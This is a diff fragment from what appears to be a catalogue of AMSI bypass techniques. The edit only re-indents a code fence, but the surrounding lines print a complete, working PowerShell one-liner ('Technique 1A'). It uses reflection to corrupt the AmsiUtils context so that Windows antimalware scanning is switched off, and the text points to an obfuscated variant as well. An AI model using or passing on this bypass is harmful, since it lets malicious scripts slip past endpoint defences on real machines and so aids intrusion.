@@ -83,7 +83,7 @@ amsiInitFailed
       * Technique 1A: Overwrite `AmsiUtils.amsiContext`'s object (`_HAMSICONTEXT.Signature`) byte. Length: 146 bytes.
       ```
       [Runtime.InteropServices.Marshal]::WriteByte((([Ref].Assembly.GetTypes()|?{$_-clike'*Am*ls'}).GetFields(40)|?{$_-clike'*xt'}).GetValue($null),0x5)
-   ```
+      ```
 
       * Technique 1B: Same as 1A, but obfuscated variant. (256 bytes)
       ```
